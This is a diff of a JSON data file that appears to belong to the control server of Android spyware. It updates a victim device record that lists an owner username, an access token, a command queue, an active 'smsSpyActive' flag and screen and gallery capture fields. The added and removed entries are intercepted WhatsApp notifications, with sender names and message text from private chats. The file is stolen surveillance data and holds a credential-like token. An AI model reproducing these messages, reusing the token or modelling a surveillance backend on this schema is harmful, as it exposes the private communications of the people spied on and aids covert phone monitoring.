@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776001769011,
+    "lastSeen": 1776001775103,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "⚊` 𝑳𝑝𝒎 & 𝑳𝑎𝒑𝑎𝒌 𝑵𝑒𝒆𝒅 𝐴𝒍𝑙 𝑹𝒂𝑽𝒆𝒏𝑬𝒍 ⋆˚🕸️˚⋆. 𝑳𝑬𝑭𝑻? 𝑰𝒁𝑰𝑵.",
+        "content": "~ mbull.: ① Foto",
+        "time": "12/04 20:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776001775435
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "⚊` 𝑳𝑝𝒎 & 𝑳𝑎𝒑𝑎𝒌 𝑵𝑒𝒆𝒅 𝐴𝒍𝑙 𝑹𝒂𝑽𝒆𝒏𝑬𝒍 ⋆˚🕸️˚⋆. 𝑳𝑬𝑭𝑻? 𝑰𝒁𝑰𝑵.",
+        "content": "~ mbull.: ① Foto",
+        "time": "12/04 20:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776001771909
+      },
       {
         "appName": "WhatsApp",
         "sender": "⚊` 𝑳𝑝𝒎 & 𝑳𝑎𝒑𝑎𝒌 𝑵𝑒𝒆𝒅 𝐴𝒍𝑙 𝑹𝒂𝑽𝒆𝒏𝑬𝒍 ⋆˚🕸️˚⋆. 𝑳𝑬𝑭𝑻? 𝑰𝒁𝑰𝑵.: ~ mbull.",
@@ -4107,22 +4123,6 @@
         "time": "12/04 00:05",
         "pkg": "com.whatsapp",
         "receivedAt": 1775927141108
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈: ~ tapzyUrPrblm",
-        "content": "gambleh",
-        "time": "12/04 00:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927141039
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Mengunduh 1 video",
-        "content": "dari Robzz x Arzz JASDIT MENTAHAN",
-        "time": "12/04 00:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927114339
       }
     ],
     "galleryPhotos": [],
